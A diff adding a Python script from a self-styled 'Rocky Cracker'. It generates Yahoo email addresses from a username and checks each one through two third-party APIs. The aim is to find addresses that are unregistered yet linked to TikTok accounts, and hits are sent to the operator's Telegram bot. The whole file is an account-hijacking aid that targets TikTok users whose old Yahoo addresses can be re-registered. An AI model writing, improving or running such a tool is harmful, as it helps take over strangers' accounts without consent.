@@ -1,0 +1,102 @@
+""" 
+-------------------------------------------------------------------------
+By : R_Cracker
+-------------------------------------------------------------------------
+      
+""" 
+
+try:
+	import os,sys,time,requests,json,random,user_agent,threading
+	from user_agent import generate_user_agent
+	from concurrent.futures import ThreadPoolExecutor
+except ImportError:
+	os.system("pip install requests")
+	os.system("pip install user_agent")
+	
+	
+A = "\033[;97m"
+B = "\033[;97m"
+C = "\033[;97m"
+E = "\033[;97m"
+H = "\033[;97m"
+K = "\033[;97m"
+L = "\033[;97m"
+
+def baner():
+	banera = f"""{E}
+    
+  88888888888 d8b 888  88888888888       888      
+      888     Y8P 888      888           888      
+      888         888      888           888      
+      888     888 888  888 888   .d88b.  888  888 
+      888     888 888 .88P 888  d88""88b 888 .88P 
+      888     888 888888K  888  888  888 888888K  
+      888     888 888 "88b 888  Y88..88P 888 "88b 
+      888     888 888  888 888   "Y88P"  888  888 
+                                                                                                 
+  \033[1;97m < \033[1;97mRocky Cracker\033[1;97m >  \033[1;97m 
+ ---------------------------
+  
+"""     
+
+	for sidra in banera.splitlines():
+		time.sleep(0.05)
+		print(sidra)
+		
+def clear():
+	if os.name == 'nt':
+		os.system('cls')
+		os.system('title Cod BY Rocky ')
+	else:
+		os.system('clear')
+		
+
+
+def TikTok(username,TK, ID):
+	ok = 0
+	cp = 0
+	si = "0987654321"
+	sh = "@yahoo.com"
+	while True:
+		eml = str(''.join(random.choice(si)for i in range(3)))
+		email = str(username)+str(eml)+str(sh)
+		headers = {
+       'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
+       'Accept-Encoding': 'gzip, deflate, br',
+       'Accept-Language': 'en-US,en;q=0.9,ar;q=0.8',
+       'Connection': 'keep-alive',
+       'Host': 'Sidraapi.pythonanywhere.com',
+       'User-Agent': str(generate_user_agent())} 
+    
+		header = {
+       'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
+       'Accept-Encoding': 'gzip, deflate, br',
+       'Accept-Language': 'en-US,en;q=0.9,ar;q=0.8',
+       'Connection': 'keep-alive',
+       'Host': 'kakawi-v2.herokuapp.com',
+       'User-Agent': str(generate_user_agent())} 
+       
+		Yahoo = requests.get(f"https://sidraapi.pythonanywhere.com/v1/api/check/yahoo/?email={email}",headers=headers)
+		Tikpy = requests.get(f"https://kakawi-v2.herokuapp.com/check/tiktok/?email={email}",headers=header)
+		if (Yahoo.json()["check"])=="True": 
+			pass
+			if (Tikpy.json()["result"])=="True": 
+				ok+=1
+				massage = ("• Email TikTok ✓\n =================\n[~] Email : "+str(email)+"\n=================\n• @RockyCracker")
+				requests.get("https://api.telegram.org/bot"+str(TK)+"/sendMessage?chat_id="+str(ID)+"&text="+str(massage))
+				
+		else:
+			cp+=1
+			print("\r\033[1;92m[•] GOOD : {} \033[1;92m[x] \033[1;91mBad :\033[1;91m {} \033[1;91m[-] \033[1;91m{}".format(str(ok),str(cp),str(email),end=''))
+			
+
+
+clear();baner()
+TK = input(C+" ("+E+"⌯"+C+") "+C+ "TOKEN BOT :"+B)
+ID = input(C+" ("+E+"⌯"+C+") "+C+ "ID  :"+B)
+clear();baner()
+username = input(C+" ("+E+"⌯"+C+") "+C+ "USERNAME :"+B)
+clear();baner()
+with ThreadPoolExecutor(max_workers=30) as kakawi:
+	kakawi.submit(TikTok,username,TK,ID)
+	
